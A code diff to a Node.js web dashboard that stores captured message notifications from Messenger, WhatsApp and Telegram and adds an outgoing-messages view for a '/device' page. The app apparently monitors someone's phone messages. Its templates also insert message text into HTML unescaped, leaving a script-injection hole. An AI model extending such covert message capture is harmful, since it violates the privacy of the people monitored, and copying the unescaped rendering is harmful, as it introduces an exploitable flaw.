@@ -93,7 +93,9 @@ const NotificationSchema = new mongoose.Schema({
     app: String,
     sender: String,
     chat_id: { type: String, default: '' },
+    recipient: { type: String, default: '' },
     message: String,
+    direction: { type: String, default: 'incoming' },
     received_at: Date
 });
 
@@ -827,23 +829,53 @@ app.get('/device', async (req, res) => {
     <img id="lightbox-img" style="max-width:90%;max-height:90%;border-radius:8px;"/>
 </div>
 
-      <!-- Messages Tab -->
+     <!-- Messages Tab -->
 <div id="tab-messages" class="tab-content">
     <div class="card">
-        <!-- Level 1: App selector -->
-        <div id="msg-level-apps">
-    <h3 style="margin-bottom:16px;color:#1a1a2e">Messaging Apps</h3>
-    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px">
-        ${['Messenger','WhatsApp','Telegram'].map(function(app) {
-            const count = notifications.filter(function(n) { return n.app === app; }).length;
-            const icon = app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️';
-            return '<div onclick="showChats(\'' + app + '\')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" '
-                + 'onmouseover="this.style.borderColor=\'#1a1a2e\'" onmouseout="this.style.borderColor=\'#eee\'">'
-                + '<div style="font-size:28px;margin-bottom:8px">' + icon + '</div>'
-                + '<div style="font-weight:bold;color:#1a1a2e">' + app + '</div>'
-                + '<div style="color:#888;font-size:12px;margin-top:4px">' + count + ' messages</div>'
-                + '</div>';
-        }).join('')}
+        <div style="display:flex;gap:8px;margin-bottom:16px">
+            <button class="btn btn-primary" onclick="showDirection('incoming', this)" id="btn-incoming">📥 Incoming</button>
+            <button class="btn" onclick="showDirection('outgoing', this)" id="btn-outgoing" style="background:#eee;color:#333">📤 Outgoing</button>
+        </div>
+
+        <!-- Incoming -->
+        <div id="msg-incoming">
+            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px">
+                ${['Messenger','WhatsApp','Telegram'].map(function(app) {
+                    const count = notifications.filter(function(n) { return n.app === app && n.direction !== 'outgoing'; }).length;
+                    const icon = app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️';
+                    return '<div onclick="showIncomingChats(\'' + app + '\')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" '
+                        + 'onmouseover="this.style.borderColor=\'#1a1a2e\'" onmouseout="this.style.borderColor=\'#eee\'">'
+                        + '<div style="font-size:28px;margin-bottom:8px">' + icon + '</div>'
+                        + '<div style="font-weight:bold;color:#1a1a2e">' + app + '</div>'
+                        + '<div style="color:#888;font-size:12px;margin-top:4px">' + count + ' messages</div>'
+                        + '</div>';
+                }).join('')}
+            </div>
+            <div id="incoming-chats" style="display:none">
+                <button class="btn" onclick="document.getElementById('incoming-chats').style.display='none'" style="background:#eee;color:#333;margin-bottom:12px">← Back</button>
+                <div id="incoming-chats-list"></div>
+            </div>
+            <div id="incoming-messages" style="display:none">
+                <button class="btn" onclick="document.getElementById('incoming-messages').style.display='none';document.getElementById('incoming-chats').style.display='block'" style="background:#eee;color:#333;margin-bottom:12px">← Back</button>
+                <h4 id="incoming-messages-title" style="margin-bottom:12px;color:#1a1a2e"></h4>
+                <div id="incoming-messages-list"></div>
+            </div>
+        </div>
+
+        <!-- Outgoing -->
+        <div id="msg-outgoing" style="display:none">
+            <table>
+                <tr><th>App</th><th>Sent To</th><th>Message</th><th>Date</th></tr>
+                ${notifications.filter(function(n) { return n.direction === 'outgoing'; }).map(function(n) {
+                    return '<tr>'
+                        + '<td>' + n.app + '</td>'
+                        + '<td>' + (n.recipient || n.chat_id || '-') + '</td>'
+                        + '<td>' + n.message + '</td>'
+                        + '<td>' + new Date(n.received_at).toLocaleString() + '</td>'
+                        + '</tr>';
+                }).join('')}
+            </table>
+        </div>
     </div>
 </div>
 
